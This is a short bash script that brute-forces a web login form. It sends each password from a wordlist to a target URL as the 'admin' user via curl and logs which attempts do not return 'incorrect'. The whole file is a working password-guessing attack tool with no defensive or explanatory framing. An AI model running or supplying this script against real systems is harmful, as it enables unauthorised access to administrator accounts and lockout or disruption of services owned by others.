#!/bin/bash
lines=$(wc -l $2 | cut -d' ' -f1)
i=0
> ./curl_brute.out

while read line; do
	i=$((i+1))
	counter=$(curl --silent --data "username=admin" --data "password=$line" $1 | grep -c "incorrect")
	echo "[" $counter "]" $line >> ./curl_brute.out
	echo -ne '['"$i"'/'"$lines"']\r'
done <$2
